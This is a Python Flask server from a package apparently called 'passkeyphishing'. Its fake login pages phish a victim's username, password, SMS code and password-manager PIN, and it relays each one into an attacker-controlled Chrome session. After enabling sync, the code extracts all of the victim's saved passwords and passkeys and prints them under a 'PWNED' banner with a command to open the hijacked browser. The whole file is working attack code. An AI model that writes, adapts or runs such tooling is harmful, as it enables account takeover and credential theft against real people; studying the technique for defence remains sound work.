# Importing flask module in the project is mandatory
# An object of Flask class is our WSGI application.

from flask import Flask, request, redirect, url_for, render_template

from passkeyphishing.chrome import Chrome
from passkeyphishing.colors import print_info, print_important, print_pwned

# Flask constructor takes the name of
# current module (__name__) as argument.
app = Flask(__name__)


chrome_browser = Chrome()

# The route() function of the Flask class is a decorator,
# which tells the application which URL should call
# the associated function.
@app.route('/')
# ‘/’ URL is bound with hello_world() function.
def index():
    # Reset our Chrome
    chrome_browser.restart_chrome()
    return render_template("index.html")


@app.post('/password')
def password_page():
    username = request.form.get('username')
    if username is None:
        return redirect(url_for('index'))
    print_important(f"1. Phished username: {username}")
    print_info("Entering username into Chrome...")
    chrome_browser.enter_text(username.encode())
    return render_template("password.html", username=username)

@app.post('/verify')
def verify():
    username = request.form.get('username')
    password = request.form.get('password')
    if username is None or password is None:
        return redirect(url_for('index'))
    print_important(f"2. Phished password: {password}")
    print_info("Entering password into Chrome...")
    chrome_browser.enter_text(password.encode())
    return render_template("verify.html", username=username, password=password)


@app.post('/sms')
def sms():
    username, password = request.form.get('username'), request.form.get('password')
    if username is None or password is None:
        return redirect(url_for(''))
    print_info(f"Selecting SMS code in Chrome...")
    chrome_browser.select_sms_code()
    return render_template("sms.html", username=username, password=password)

@app.post('/pmpin')
def pmpin():
    username, password, phone = request.form.get('username'), request.form.get('password'), request.form.get('phone')

    # Enter the pin
    print_important(f"3. Phished SMS code: ({phone})")
    print_info(f"Entering SMS code into Chrome...")
    chrome_browser.enter_text(phone.encode())
    return render_template("password_manager_pin.html", username=username, password=password, phone=phone)


@app.post('/pwned')
def pwned():
    password_manager_pin = "".join(request.form.getlist('pin[]'))
    username, password, phone = request.form.get('username'), request.form.get('password'), request.form.get('phone')

    # Have we phished everything?
    if username is None or password is None:
        return redirect(url_for('index'))

    print_important(f"4. Phished password manager PIN: ({password_manager_pin})")

    chrome_browser.agree_to_sync()

    # All should be good, get the passwords and passkeys
    passwords = chrome_browser.get_passwords()
    passkeys = chrome_browser.get_passkeys()

    print_pwned(f"******************** PWNED ********************")
    print_pwned(f"\tUsnermae: {username}\n"
                f"\tPassword: {password}\n"
                f"\tSMS Code: {phone}\n"
                f"\tMngr PIN: {password_manager_pin}")
    print_pwned("Passwords:")
    print(*passwords, sep='\n')
    print_pwned("Passkeys:")
    print(*passkeys, sep='\n')
    print_pwned("\n"
          f"\tCommand to launch attack browser for {username}: \n"
                f"\t\tgoogle-chrome --user-data-dir={chrome_browser.tmp_dir}\n")
    print_pwned("*"*50)
    return render_template("pwned.html", username=username, password=password, phone=phone,
                           password_manager_pin=password_manager_pin,
                           passwords=passwords,
                           passkeys=passkeys)

# main driver function
if __name__ == '__main__':

    # run() method of Flask class runs the application
    # on the local development server.
    app.run(debug=True)